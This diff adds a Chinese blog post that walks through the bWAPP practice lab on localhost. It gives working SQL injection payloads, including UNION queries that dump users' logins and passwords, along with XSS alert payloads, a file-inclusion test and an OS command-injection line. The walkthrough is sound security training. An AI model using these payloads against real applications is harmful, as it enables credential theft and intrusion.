@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>BWAPP打靶随记 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>BWAPP打靶随记</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-30T08:38:00.000Z" id="date"> 2023-06-30</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-02T05:18:10.670Z" id="updated"> 2023-07-02</time></div></span></div></div><hr><div id="post-content"><p>这篇文章的靶场是bwapp靶场</p>
+<span id="more"></span>
+
+<p>迎面而来的第一个靶场是html注入</p>
+<p>这给我搞懵了，没听说过啊？</p>
+<p>然后又往后翻了翻，他这也不是xss注入，那是什么？我尝试的输入了一个xss的payload——————弹窗了？！</p>
+<p>一脸懵的我赶紧问了chatgpt</p>
+
+
+<p>（电脑上找不出表情包形容我的心情114514又是一堆要学的）</p>
+<hr>
+<p>废话不多说，从零开始打靶！</p>
+<p><strong>注：本靶场的Medium和High无法攻破，不演示</strong></p>
+<h1 id="SQL-Injection-GET-x2F-Search"><a href="#SQL-Injection-GET-x2F-Search" class="headerlink" title="SQL Injection (GET&#x2F;Search)"></a>SQL Injection (GET&#x2F;Search)</h1><ol>
+<li><p>判断闭合为单引号</p>
+</li>
+<li><p>判断字段数为7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=宝宝巴士&#x27; order by 7--+&amp;action=search<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>注出回显点为2，3，4，5</p>
+</li>
+<li><p>获取表名 blog,heroes,movies,users,visitors</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database()--+&amp;action=search<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取列名 id,login,password,email,secret,activation_code,activated,reset_code,admin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+&amp;action=search<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取全部数据（这里只获取部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(id,&#x27;:&#x27;,login,&#x27;-&#x27;,password),6,7 from users--+&amp;action=search<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="SQL-Injection-GET-x2F-Select"><a href="#SQL-Injection-GET-x2F-Select" class="headerlink" title="SQL Injection (GET&#x2F;Select)"></a>SQL Injection (GET&#x2F;Select)</h1><p>测试出这是数字型注入</p>
+<p>这一关只给了我们id&#x3D;多少的电影，推测后台语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from movies where id=$id<br></code></pre></td></tr></table></figure>
+
+<p>推测处了这个那构造语句就不难了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?movie=6 and extractvalue(1,concat(0x7e,(database())))&amp;action=go<br></code></pre></td></tr></table></figure>
+
+<p>之后的略</p>
+<h1 id="SQL-Injection-POST-x2F-Search"><a href="#SQL-Injection-POST-x2F-Search" class="headerlink" title="SQL Injection (POST&#x2F;Search)"></a>SQL Injection (POST&#x2F;Search)</h1><p>这是搜索型注入，一般的语句都是这样的：</p>
+<p>一个百分号加上单引号闭合的，但加不加都不影响注入 </p>
+<p>bp拦截之后放到hackbar然后开始构造语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">title=a&#x27; and extractvalue(1,concat(0x7e,(database())))#&amp;action=search<br></code></pre></td></tr></table></figure>
+
+<p>之后的略</p>
+<h1 id="SQL-Injection-POST-x2F-Select"><a href="#SQL-Injection-POST-x2F-Select" class="headerlink" title="SQL Injection (POST&#x2F;Select)"></a>SQL Injection (POST&#x2F;Select)</h1><p>数字型注入，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movie=1 and extractvalue(1,concat(0x7e,(database())))&amp;action=go<br></code></pre></td></tr></table></figure>
+
+<p>剩下的略</p>
+<h1 id="SQL-Injection-AJAX-x2F-JSON-x2F-jQuery"><a href="#SQL-Injection-AJAX-x2F-JSON-x2F-jQuery" class="headerlink" title="SQL Injection (AJAX&#x2F;JSON&#x2F;jQuery)"></a>SQL Injection (AJAX&#x2F;JSON&#x2F;jQuery)</h1><p>ajax他是一个异步通讯，能够在网页不刷新的情况下，刷新网页内部的东西<br>而它的返回值一般是json&#x2F;xml格式的，jQuery中提供实现ajax的方法</p>
+<p>payload和前面的Sql Injection (GET&#x2F;Search)一样</p>
+<h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><p>输入验证码之后就和Sql Injection (GET&#x2F;Search)一样了，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=a&#x27; and extractvalue(1,concat(0x7e,(database())))--+&amp;action=search<br></code></pre></td></tr></table></figure>
+
+<h1 id="SQL-Injection-Login-Form-x2F-Hero"><a href="#SQL-Injection-Login-Form-x2F-Hero" class="headerlink" title="SQL Injection (Login Form&#x2F;Hero)"></a>SQL Injection (Login Form&#x2F;Hero)</h1><p>登录界面。。尝试万能密码————成功</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; and extractvalue(1,concat(0x7e,(database())))#<br></code></pre></td></tr></table></figure>
+
+<p>后面的略</p>
+<h1 id="SQL-Injection-Login-Form-x2F-User-96"><a href="#SQL-Injection-Login-Form-x2F-User-96" class="headerlink" title="SQL Injection (Login Form&#x2F;User)&#96;"></a>SQL Injection (Login Form&#x2F;User)&#96;</h1><p>这一关我做了很久没有做出来，看了一下wt还是有点似懂非懂，留个坑后面回来补</p>
+<h1 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h1><p>这一关需要sqllite这个module，我懒得安装了直接看wt去吧</p>
+<p>其实和最简单的sql注入没有任何区别</p>
+<h1 id="Drupal-SQL-Injection-Drupageddon"><a href="#Drupal-SQL-Injection-Drupageddon" class="headerlink" title="Drupal SQL Injection (Drupageddon)"></a>Drupal SQL Injection (Drupageddon)</h1><blockquote>
+<p>The <a target="_blank" rel="noopener" href="http://127.0.0.1/drupal/">Drupal</a> version is vulnerable to SQL injection! (<a target="_blank" rel="noopener" href="http://sourceforge.net/projects/bwapp/files/bee-box/">bee-box</a> only)</p>
+<p>HINT: <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704">CVE-2014-3704</a></p>
+</blockquote>
+<p>这一关的靶场环境依旧懒得搭建，不过既然是cve漏洞就可以使用msf一把梭</p>
+<p>可以看看这篇wt：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104545171">https://blog.csdn.net/angry_program/article/details/104545171</a></p>
+<h1 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h1><p>这乍一眼一看，xss注入，但是这同样会涉及到indert、delete注入（之前pikachu有一道类似的）</p>
+<p>不用看，直接构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;<br></code></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h1 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h1><p>Mysql换成了sqlite，只是些sql语句写法变了, 思路不变</p>
+<h1 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h1><p>看到标题就知道要干什么了，然后下面有一个表格记录我们的ua，那就是ua下的insert注入，我们吧上一关的payload放到ua里面即可</p>
+
+
+<h1 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h1>
+
+<p>但是这怎么利用呢？？抓包看看</p>
+
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">reset</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">login</span>&gt;</span>bee<span class="hljs-tag">&lt;/<span class="hljs-name">login</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">secret</span>&gt;</span>Any bugs?<span class="hljs-tag">&lt;/<span class="hljs-name">secret</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">reset</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>ok啊，豁然开朗，他应该是把标签里面夹着的东西insert进去了，那我们对标签里面的内容进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;reset&gt;&lt;login&gt;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>芜湖！~</p>
+<h1 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h1><p>判断闭合单引号，测试是否具备盲注条件，为了测试先找一个电影吧：G.I. Joe: Retaliation</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?title=G.I. Joe: Retaliation&#x27; and 1=1 --+&amp;action=search   exists 正常<br>?title=G.I. Joe: Retaliation&#x27; and 1=2 --+&amp;action=search   does not exists 不正常<br></code></pre></td></tr></table></figure>
+
+<p>具备注入条件，后面的略</p>
+<h1 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h1><p>看标题，时间盲注，直接构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">G.I. Joe: Retaliation&#x27; and sleep(if((1=2), 0, 3)) #    延时<br>G.I. Joe: Retaliation&#x27; and sleep(if((1=1), 0, 3)) #    不延时<br></code></pre></td></tr></table></figure>
+
+<p>具备注入条件，后面的略</p>
+<h1 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h1><p>同SQL Injection - Blind - Boolean-Based</p>
+<h1 id="SQL-Injection-Blind-WS-x2F-SOAP"><a href="#SQL-Injection-Blind-WS-x2F-SOAP" class="headerlink" title="SQL Injection - Blind (WS&#x2F;SOAP)"></a>SQL Injection - Blind (WS&#x2F;SOAP)</h1><p>字符型注入, 猜测sql语句如下:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> tickets <span class="hljs-keyword">from</span> moives <span class="hljs-keyword">where</span> title=<span class="hljs-string">&#x27;$title&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>那后面的盲注就简单了，略</p>
+<hr>
+<p>至此，bwapp的sql靶场结束，开始xss部分</p>
+<h1 id="XSS-Reflected-GET"><a href="#XSS-Reflected-GET" class="headerlink" title="XSS - Reflected (GET)"></a>XSS - Reflected (GET)</h1><p>这一关有两个输入框，我们将两个最简单的payload放两个框里面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就弹窗了</p>
+<h1 id="XSS-Reflected-POST"><a href="#XSS-Reflected-POST" class="headerlink" title="XSS - Reflected (POST)"></a>XSS - Reflected (POST)</h1><p>和上一关payload一样，知识换了get和post的提交方式而已</p>
+<h1 id="XSS-Reflected-JSON"><a href="#XSS-Reflected-JSON" class="headerlink" title="XSS - Reflected (JSON)"></a>XSS - Reflected (JSON)</h1><p>我们随便输入一个字符“a”，查看页面源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var JSONResponseString = &#x27;&#123;&quot;movies&quot;:[&#123;&quot;response&quot;:&quot;a??? Sorry, we don&amp;#039;t have that movie :(&quot;&#125;]&#125;&#x27;;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到单引号被实体化了，并且这里我们需要注意闭合，构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&#125;]&#125;&#x27;alert(1)//<br></code></pre></td></tr></table></figure>
+
+<p>注意这里需要使用注释符把后面的东西给注释掉不影响代码的执行，并且这里的alert弹窗不需要左右标签script，因为json是在页面内加载的</p>
+<h1 id="XSS-Reflected-AJAX-x2F-JSON"><a href="#XSS-Reflected-AJAX-x2F-JSON" class="headerlink" title="XSS - Reflected (AJAX&#x2F;JSON)"></a>XSS - Reflected (AJAX&#x2F;JSON)</h1><p>ajax就是异步的意思，立刻做出反应回显</p>
+<p>但是这一关我似乎环境出现了问题，对我的输入没有反应。。。。那就给一个wt的payload吧</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Reflected-AJAX-x2F-XML"><a href="#XSS-Reflected-AJAX-x2F-XML" class="headerlink" title="XSS - Reflected (AJAX&#x2F;XML)"></a>XSS - Reflected (AJAX&#x2F;XML)</h1><p>同样环境有问题。。。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Reflected-Back-Button"><a href="#XSS-Reflected-Back-Button" class="headerlink" title="XSS - Reflected (Back Button)"></a>XSS - Reflected (Back Button)</h1><p>是个clickbutton，bp抓包，但是我们不知道我们应该把注入语句放在哪里，打开源代码看看</p>
+
+
+<p>referer注入，并且需要闭合，构造出payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<h1 id="XSS-Reflected-Custom-Header"><a href="#XSS-Reflected-Custom-Header" class="headerlink" title="XSS - Reflected (Custom Header)"></a>XSS - Reflected (Custom Header)</h1><p>做不出来。。。。跟着wt做也还是没有成功，应该是环境的问题</p>
+
+
+<h1 id="XSS-Reflected-Eval"><a href="#XSS-Reflected-Eval" class="headerlink" title="XSS - Reflected (Eval)"></a>XSS - Reflected (Eval)</h1><p>这一关显示出来了现在的时间，再看上面的url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/bwapp/xss_eval.php?date=Date()<br></code></pre></td></tr></table></figure>
+
+<p>执行了Date()函数，再看标题，看来是使用了eval函数，我们可以再url里面注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/bwapp/xss_eval.php?date=alert(1)<br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Reflected-HREF"><a href="#XSS-Reflected-HREF" class="headerlink" title="XSS - Reflected (HREF)"></a>XSS - Reflected (HREF)</h1><p>查看页面源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;td align=&quot;center&quot;&gt; &lt;a href=xss_href-3.php?movie=1&amp;name=aaaaction=vote&amp;action=vote&gt;Vote&lt;/a&gt;&lt;/td&gt;<br></code></pre></td></tr></table></figure>
+
+<p>闭合即可，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&lt;img src=1 onerror=alert(1)&gt;//<br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Reflected-Login-Form"><a href="#XSS-Reflected-Login-Form" class="headerlink" title="XSS - Reflected (Login Form)"></a>XSS - Reflected (Login Form)</h1><p>一看到登录页面就第一个想到了万能密码，但是xss的登录密码怎么构造呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or 1=1;&quot;&lt;img src=1 onerror=alert(/xss/)&gt;&quot;<br></code></pre></td></tr></table></figure>
+
+<p>实现原理：通过数据库报错将payload回显，从而触发xss</p>
+<h1 id="phpMyAdmin-BBCode-Tag-XSS"><a href="#phpMyAdmin-BBCode-Tag-XSS" class="headerlink" title="phpMyAdmin BBCode Tag XSS"></a>phpMyAdmin BBCode Tag XSS</h1><p>CVE，且需要bee box，看wt吧</p>
+<h1 id="XSS-Reflected-PHP-SELF"><a href="#XSS-Reflected-PHP-SELF" class="headerlink" title="XSS - Reflected (PHP_SELF)"></a>XSS - Reflected (PHP_SELF)</h1><p>同XSS - Reflected (GET)</p>
+<h1 id="XSS-Reflected-Referer"><a href="#XSS-Reflected-Referer" class="headerlink" title="XSS - Reflected (Referer)"></a>XSS - Reflected (Referer)</h1><p>referer注入，把payload放到referer里面就可以了，上一关的payload放到ua即可，因为页面展示出来了当前用户的referer：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="XSS-Reflected-User-Agent"><a href="#XSS-Reflected-User-Agent" class="headerlink" title="XSS - Reflected (User-Agent)"></a>XSS - Reflected (User-Agent)</h1><p>上一关的payload放到ua即可，因为页面展示出来了当前用户的ua</p>
+<h1 id="XSS-Stored-Blog"><a href="#XSS-Stored-Blog" class="headerlink" title="XSS - Stored (Blog)"></a>XSS - Stored (Blog)</h1><p>把上一关的payload放到留言板即可，这是个存储型xss，因此刷新之后一直有</p>
+<h1 id="XSS-Stored-Change-Secret"><a href="#XSS-Stored-Change-Secret" class="headerlink" title="XSS - Stored (Change Secret)"></a>XSS - Stored (Change Secret)</h1><p>输入payload之后并不会弹窗，看样子是会存储进数据库，那我们看看输入单引号会不会报错，，，没有，因此不能通过报错回显来注入</p>
+<p>查看网页源代码，发现有一个名为login的隐藏的输入框</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;input type=&quot;hidden&quot; name=&quot;login&quot; value=&quot;bee&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>用burp抓包，发现提交了三个参数：secret、login、action，那login这一框应该就是对应的这个隐藏的输入框了，构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="XSS-Stored-Cookies"><a href="#XSS-Stored-Cookies" class="headerlink" title="XSS - Stored (Cookies)"></a>XSS - Stored (Cookies)</h1><p>这道题做了半天还是不懂，wt里面讲不清楚，找到了一篇韩国佬的wt：</p>
+<p><a target="_blank" rel="noopener" href="http://securitycode.tistory.com/200">http://securitycode.tistory.com/200</a></p>
+<p>讲的不错</p>
+<h1 id="SQLiteManager"><a href="#SQLiteManager" class="headerlink" title="SQLiteManager"></a>SQLiteManager</h1><blockquote>
+<p>The <a target="_blank" rel="noopener" href="http://127.0.0.1/sqlite/">SQLiteManager</a> version is vulnerable to Cross-Site Scripting! (<a target="_blank" rel="noopener" href="http://sourceforge.net/projects/bwapp/files/bee-box/">bee-box</a> only)</p>
+<p>HINT: <a target="_blank" rel="noopener" href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5105">CVE-2012-5105</a></p>
+</blockquote>
+<p>跳过</p>
+<h1 id="XSS-Stored-User-Agent"><a href="#XSS-Stored-User-Agent" class="headerlink" title="XSS - Stored (User-Agent)"></a>XSS - Stored (User-Agent)</h1><p>把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>放到ua里面就可以了</p>
+<hr>
+<p>至此xss的部分就结束了</p>
+<h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><p>这一关有两个输入框，我们将两个最简单的payload放两个框里面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就弹窗了，和XSS - Reflected (GET)一样</p>
+<h1 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h1><p>同上，和XSS - Reflected (POST)一样</p>
+<h1 id="HTML-Injection-Reflected-URL"><a href="#HTML-Injection-Reflected-URL" class="headerlink" title="HTML Injection - Reflected (URL)"></a>HTML Injection - Reflected (URL)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?a=&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>没什么好说的吧这个太简单了</p>
+<h1 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h1><p>这道题不是之前做过了吗？直接插入注入语句就可以弹窗了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><p>这一关看上去似乎是一个robots君子协议的文件，不知道从哪里下手。。。但是我们看标题，给了我们提示，Frame的意思是“框架”，似乎和这道题的语境没有什么关系</p>
+<p>我们可以再想一想，既然是robots.txt，我们直接访问可以吗？发现自己访问同样是可以的，那为什么多此一举写一个文件帮我们读取呢？此时就可以想到文件包含漏洞！</p>
+<p>尝试让他访问靶场根目录的phpinfo.php</p>
+
+
+<p>成功利用文件包含漏洞</p>
+<h1 id="LDAP-Connection-Settings"><a href="#LDAP-Connection-Settings" class="headerlink" title="LDAP Connection Settings"></a>LDAP Connection Settings</h1><p>因为要安装环境，看wp：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hee_mee/article/details/108568839">https://blog.csdn.net/hee_mee/article/details/108568839</a></p>
+<h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1>
+
+<p>这道题曾经才ctf做过，利用管道符“&amp;”实现一行命令执行多条命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">www.nsa.gov &amp; ipconfig<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h1><p>url:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/bwapp/phpi.php?message=test<br></code></pre></td></tr></table></figure>
+
+<p>message参数输入什么，页面就打印什么，因此phpi.php这个文件可能就是获取参数message的值然后echo出来，我们可以尝试让他自动执行一些函数，例如phpinfo()</p>
